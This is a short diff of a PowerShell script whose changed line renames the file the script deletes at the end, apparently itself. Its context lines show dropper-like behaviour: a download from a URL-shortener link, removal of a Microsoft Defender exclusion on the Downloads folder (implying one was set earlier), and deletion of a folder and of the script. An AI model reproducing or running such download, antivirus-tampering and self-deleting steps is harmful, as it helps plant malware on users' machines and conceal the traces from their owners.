@@ -15,4 +15,4 @@ Invoke-WebRequest -Uri "https://acortar.link/CFV7AS" -OutFile "$env:USERPROFILE\
 cd "$env:USERPROFILE\Downloads"
 Remove-Item -Path "$env:USERPROFILE\Downloads\digi" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
-Remove-Item -Path "$env:USERPROFILE\Downloads\powershellcode" -Force
+Remove-Item -Path "$env:USERPROFILE\Downloads\powershellcode.ps1" -Force
